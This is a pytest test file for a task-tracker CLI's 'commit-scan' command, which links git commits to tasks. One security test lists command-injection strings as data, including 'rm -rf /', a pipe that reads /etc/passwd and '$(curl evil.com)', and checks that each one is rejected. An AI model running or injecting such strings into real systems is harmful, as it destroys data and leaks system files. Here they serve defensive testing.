"""Test CLI commit-scan command."""

import sqlite3
import subprocess
from pathlib import Path

import pytest

from formaltask.epics import create_epic
from formaltask.tasks.crud import create_task
from tests.fixtures.paths import PROJECT_ROOT, SCHEMA_FILE


def _create_db_with_migrations(db_path: Path) -> None:
    """Create database with schema and pre-populated migrations table."""
    schema_file = SCHEMA_FILE
    with sqlite3.connect(db_path) as conn:
        with open(schema_file) as f:
            conn.executescript(f.read())
        conn.execute("""
            CREATE TABLE IF NOT EXISTS schema_migrations (
                name TEXT PRIMARY KEY,
                applied_at TEXT NOT NULL
            )
        """)
        migrations_dir = PROJECT_ROOT / ".claude" / "migrations"
        if migrations_dir.exists():
            for migration_file in migrations_dir.glob("*.sql"):
                conn.execute(
                    "INSERT OR IGNORE INTO schema_migrations (name, applied_at) VALUES (?, datetime('now'))",
                    (migration_file.name,),
                )
        conn.commit()


@pytest.fixture
def test_db(tmp_path):
    """Create test database with epic and tasks using full schema."""
    db_path = tmp_path / "test.db"
    _create_db_with_migrations(db_path)

    # Create epic and tasks using standalone functions
    create_epic(db_path=str(db_path), name="test-epic", description="Test epic")
    create_task(
        db_path=str(db_path),
        epic_name="test-epic",
        title="Task 1",
        description="Description 1",
        criteria=["Criterion 1"],
    )
    create_task(
        db_path=str(db_path),
        epic_name="test-epic",
        title="Task 2",
        description="Description 2",
        criteria=["Criterion 2"],
    )

    return db_path


@pytest.fixture
def git_repo(tmp_path):
    """Create temporary git repo with test commits."""
    repo_path = tmp_path / "repo"
    repo_path.mkdir()

    # Initialize git repo
    subprocess.run(["git", "init"], cwd=repo_path, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.name", "Test User"], cwd=repo_path, check=True)

    # Create test commits with task references
    test_file = repo_path / "test.txt"

    # Commit 1: refs #1
    test_file.write_text("First commit")
    subprocess.run(["git", "add", "."], cwd=repo_path, check=True)
    subprocess.run(
        ["git", "commit", "-m", "feat: Add feature refs #1"],
        cwd=repo_path,
        check=True,
        capture_output=True,
    )

    # Commit 2: fixes #2
    test_file.write_text("Second commit")
    subprocess.run(["git", "add", "."], cwd=repo_path, check=True)
    subprocess.run(
        ["git", "commit", "-m", "fix: Fix bug fixes #2"],
        cwd=repo_path,
        check=True,
        capture_output=True,
    )

    # Commit 3: multiple references (#1 and #2)
    test_file.write_text("Third commit")
    subprocess.run(["git", "add", "."], cwd=repo_path, check=True)
    subprocess.run(
        ["git", "commit", "-m", "refactor: Update code for #1 and #2"],
        cwd=repo_path,
        check=True,
        capture_output=True,
    )

    # Commit 4: no reference
    test_file.write_text("Fourth commit")
    subprocess.run(["git", "add", "."], cwd=repo_path, check=True)
    subprocess.run(
        ["git", "commit", "-m", "chore: Update dependencies"],
        cwd=repo_path,
        check=True,
        capture_output=True,
    )

    return repo_path


def test_commit_scan_links_all_commits(test_db, git_repo, monkeypatch):
    """Test that commit-scan links all commits with task references."""
    # Run commit-scan command with git repo path
    result = subprocess.run(
        [
            "python3",
            "-m",
            "formaltask.cli.pm",
            "commit-scan",
            "--db-path",
            str(test_db),
            "--repo-path",
            str(git_repo),
        ],
        capture_output=True,
        text=True,
    )

    # Should succeed
    assert result.returncode == 0, f"Command failed: {result.stderr}"
    assert "linked" in result.stdout.lower()

    # Verify commits in database
    with sqlite3.connect(test_db) as conn:
        cursor = conn.cursor()

        # Should have 4 commit links: commit 1 → task 1, commit 2 → task 2,
        # commit 3 → task 1 and task 2
        cursor.execute("SELECT COUNT(*) FROM commits")
        assert cursor.fetchone()[0] == 4

        # Check task 1 has 2 commits (commit 1 and commit 3)
        cursor.execute("SELECT COUNT(*) FROM commits WHERE task_id = 1")
        assert cursor.fetchone()[0] == 2

        # Check task 2 has 2 commits (commit 2 and commit 3)
        cursor.execute("SELECT COUNT(*) FROM commits WHERE task_id = 2")
        assert cursor.fetchone()[0] == 2

        # Verify commit messages contain expected text
        cursor.execute("SELECT commit_message FROM commits WHERE task_id = 1")
        messages = [row[0] for row in cursor.fetchall()]
        assert any("Add feature" in msg for msg in messages)
        assert any("Update code" in msg for msg in messages)


def test_commit_scan_handles_non_git_directory(tmp_path):
    """Test that commit_scan returns empty result for non-git directories.

    When commit_scan is called against a directory that is not a git repo,
    it should gracefully return an empty result instead of crashing.
    This is important for test isolation.
    """
    from formaltask.cli.commands.commit_scan import commit_scan

    # Create a non-git directory
    non_git_dir = tmp_path / "not-a-repo"
    non_git_dir.mkdir()

    # Create database with proper schema initialization
    db_path = tmp_path / "formaltask.db"
    _create_db_with_migrations(db_path)
    create_epic(db_path=str(db_path), name="test-epic", description="Test epic description")
    create_task(
        db_path=str(db_path),
        epic_name="test-epic",
        title="Task 1",
        description="Description 1",
        criteria=["Criterion 1"],
    )

    # Should not raise, should return empty result
    result = commit_scan(db_path=str(db_path), task_id=1, repo_path=str(non_git_dir))

    assert result == {"linked_count": 0, "skipped_count": 0}


class TestCommitScanSecurity:
    """Security tests for commit_scan --since parameter."""

    def test_rejects_command_injection(self, tmp_path):
        """Command injection attempts should raise CLIError."""
        from formaltask.cli.base import CLIError
        from formaltask.cli.commands.commit_scan import commit_scan

        db_path = tmp_path / "formaltask.db"
        _create_db_with_migrations(db_path)
        create_epic(db_path=str(db_path), name="test-epic", description="Test")
        create_task(
            db_path=str(db_path),
            epic_name="test-epic",
            title="Task 1",
            description="Desc",
            criteria=["Criterion"],
        )

        malicious_inputs = [
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "2024-01-01 && echo pwned",
            "2024-01-01 | cat /etc/passwd",
            "2024-01-01; malicious",
            "${PATH}",
            "$(curl evil.com)",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(CLIError, match="Invalid date format"):
                commit_scan(db_path=str(db_path), since=malicious, repo_path=str(tmp_path))

    def test_rejects_negative_task_id(self, tmp_path):
        """Negative task_id should raise CLIError."""
        from formaltask.cli.base import CLIError
        from formaltask.cli.commands.commit_scan import commit_scan

        db_path = tmp_path / "formaltask.db"
        _create_db_with_migrations(db_path)
        create_epic(db_path=str(db_path), name="test-epic", description="Test")
        create_task(
            db_path=str(db_path),
            epic_name="test-epic",
            title="Task 1",
            description="Desc",
            criteria=["Criterion"],
        )

        with pytest.raises(CLIError, match="task_id must be a positive integer"):
            commit_scan(db_path=str(db_path), task_id=-1, repo_path=str(tmp_path))

    def test_rejects_nonexistent_repo_path(self, tmp_path):
        """Non-existent repo_path should raise CLIError."""
        from formaltask.cli.base import CLIError
        from formaltask.cli.commands.commit_scan import commit_scan

        db_path = tmp_path / "formaltask.db"
        _create_db_with_migrations(db_path)
        create_epic(db_path=str(db_path), name="test-epic", description="Test")
        create_task(
            db_path=str(db_path),
            epic_name="test-epic",
            title="Task 1",
            description="Desc",
            criteria=["Criterion"],
        )

        with pytest.raises(CLIError, match="repo_path does not exist"):
            commit_scan(db_path=str(db_path), repo_path="/nonexistent/path/to/repo")
